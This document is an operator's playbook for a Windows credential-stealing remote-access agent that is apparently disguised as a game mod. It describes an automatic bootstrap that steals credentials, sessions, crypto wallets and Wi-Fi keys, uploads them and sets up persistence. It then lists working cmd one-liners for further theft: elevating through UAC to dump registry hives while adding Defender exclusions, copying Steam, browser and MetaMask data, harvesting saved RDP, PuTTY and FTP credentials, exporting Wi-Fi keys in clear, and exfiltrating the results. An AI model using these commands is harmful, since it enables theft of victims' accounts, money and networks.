# Shell playbook

From 0.2.7 an install collects itself: on the first start the agent runs an
automatic bootstrap in the background (recon, credentials, Wi-Fi, sessions,
wallets, keys, screenshot), uploads it and turns on persistence and
auto-update. A fresh infection needs **no** commands and **no** UAC; they are
for specific things, extras or a repair. `hives` is the only manual UAC path.

Everything below runs as `cmd /c <command>` with the cwd in `%USERPROFILE%`,
a 60 s timeout, and output over 1000 characters is uploaded as an `out-<ts>.txt`.

Rules:

- one thing per command, the timeout is 60 s;
- `%VAR%` is expanded by `cmd`, use it instead of absolute paths;
- `2>nul` keeps missing folders quiet;
- collect into `cache\`, then `download` the zip and `rmdir /s /q cache`.

On a legacy tree replace the directory with `%LOCALAPPDATA%\ServerPackCore`
and `state.json` for `config.json`; the cache name is modern in both.

## 0. Check the bootstrap

```
shell dir "%LOCALAPPDATA%\FabricSync\cache" & schtasks /query /tn FabricSync /fo csv /nh >nul 2>&1 && echo TASK_OK || echo NO_TASK
```

An empty `cache` and `TASK_OK` mean it already ran. `NO_TASK` means persistence
failed and the next reboot will not bring the agent back; run `persist on` and
read the reply.

Repeat the whole automatic bootstrap (after a botched first run):

```
shell rmdir /s /q "%LOCALAPPDATA%\FabricSync\cache" 2>nul & del "%LOCALAPPDATA%\FabricSync\config.json" 2>nul
```

`config.json` holds `bootstrap`; deleting it re-arms the collector. The agent
has to be restarted for that (`kill`, or close the game).

## 1. Hives (manual fallback)

0.2.7 already unwraps v20 cookies through ABE and the Exodus machine
passphrase in the user session, so no administrator password is needed for
them. `hives` remains for offline `secretsdump` and as a fallback; it needs
UAC once and gives up after three attempts.

The manual way first — but if you have no shell access to type it, `hives`
re-runs the step on its own:

```
shell mkdir "%TEMP%\h" 2>nul & (echo schtasks /create /tn spcdump /tr "%TEMP%\h\dump.bat" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f & echo schtasks /run /tn spcdump) > "%TEMP%\h\elevate.bat" & (echo powershell -NoP -C "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\FabricSync' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'reg.exe','esentutl.exe' -ErrorAction SilentlyContinue" & echo reg save HKLM\SYSTEM "%TEMP%\h\SYSTEM.hiv" /y & echo reg save HKLM\SECURITY "%TEMP%\h\SECURITY.hiv" /y & echo robocopy C:\Windows\System32\Microsoft\Protect "%TEMP%\h\ProtectSystem" /e /njh /njs /ndl /nc /ns & echo tar -a -cf "%TEMP%\h\system.zip" -C "%TEMP%\h" SYSTEM.hiv SECURITY.hiv ProtectSystem & echo schtasks /delete /tn spcdump /f) > "%TEMP%\h\dump.bat" & powershell -NoP -C "Start-Process cmd -ArgumentList '/c',\"$env:TEMP\h\elevate.bat\" -Verb RunAs -WindowStyle Hidden" & echo uac
```

Wait 30 s, then:

```
shell dir "%TEMP%\h"
```

`system.zip` there means it worked: `shell download %TEMP%\h\system.zip`.

## 2. Steam guard files

```
shell for %f in ("%PROGRAMFILES(X86)%\Steam\ssfn*") do @copy /y "%f" "%LOCALAPPDATA%\FabricSync\cache"
```

## 3. Extra browsers / profiles

The collector takes the default profile of Chrome, Edge, Brave and all of
Firefox. For another Windows profile, or a second Chrome profile:

```
shell robocopy "%LOCALAPPDATA%\Google\Chrome\User Data\Profile 1" "%LOCALAPPDATA%\FabricSync\cache\p1" /e /njh /njs /ndl /nc /ns
```

## 4. Extension wallets of every browser

```
shell robocopy "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn" "%LOCALAPPDATA%\FabricSync\cache\mm-brave" /e /njh /njs /ndl /nc /ns
```

Same line with `Microsoft\Edge\User Data` for Edge.

## 5. Saved credentials, RDP, FTP

```
shell (cmdkey /list & reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s & reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s & dir /s /b "%USERPROFILE%\Documents\*.rdp" "%USERPROFILE%\Desktop\*.rdp" & type "%APPDATA%\FileZilla\recentservers.xml" "%APPDATA%\FileZilla\sitemanager.xml" "%APPDATA%\WinSCP.ini") > "%LOCALAPPDATA%\FabricSync\cache\creds.txt" 2>nul & type "%LOCALAPPDATA%\FabricSync\cache\creds.txt"
```

## 6. Wi-Fi

```
shell mkdir "%LOCALAPPDATA%\FabricSync\cache\wifi" 2>nul & netsh wlan export profile folder="%LOCALAPPDATA%\FabricSync\cache\wifi" key=clear >nul & tar -a -cf "%LOCALAPPDATA%\FabricSync\cache\wifi.zip" -C "%LOCALAPPDATA%\FabricSync\cache" wifi & echo done
```

## 7. Machine and identity

```
shell systeminfo > "%LOCALAPPDATA%\FabricSync\cache\recon.txt" 2>&1 & whoami /all >> "%LOCALAPPDATA%\FabricSync\cache\recon.txt" & type "%LOCALAPPDATA%\FabricSync\cache\recon.txt"
```

## 8. Interesting documents

```
shell dir /s /b "%USERPROFILE%\Desktop" "%USERPROFILE%\Documents" "%USERPROFILE%\Downloads" 2>nul | findstr /i "\.kdbx \.rdp \.ovpn \.pem \.pfx \.docx \.xlsx \.pdf" > "%LOCALAPPDATA%\FabricSync\cache\docs.txt" & type "%LOCALAPPDATA%\FabricSync\cache\docs.txt"
```

## 9. Software and AV

```
shell (reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName & wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState) > "%LOCALAPPDATA%\FabricSync\cache\software.txt" 2>&1 & type "%LOCALAPPDATA%\FabricSync\cache\software.txt"
```

## 10. Collect and clean

```
shell dir /b "%LOCALAPPDATA%\FabricSync\cache"
shell download "%LOCALAPPDATA%\FabricSync\cache\<file>"
shell rmdir /s /q "%LOCALAPPDATA%\FabricSync\cache"
```

## Notes

- The Windows install directory is `%LOCALAPPDATA%\FabricSync` (hidden). A
  legacy install keeps `%LOCALAPPDATA%\ServerPackCore` and its internal names.
- `spc.debug` in `latest.log` traces what the agent ran; `shell` output is also
  mirrored to Discord, so redirect to a file before `type` on anything long.
- Robocopy exit codes 0–7 are success; only the text output is surfaced.
- A standard (non-admin) account cannot grant the hives: UAC asks for an
  administrator password. Everything else, including ABE v20 and Discord,
  works without it.
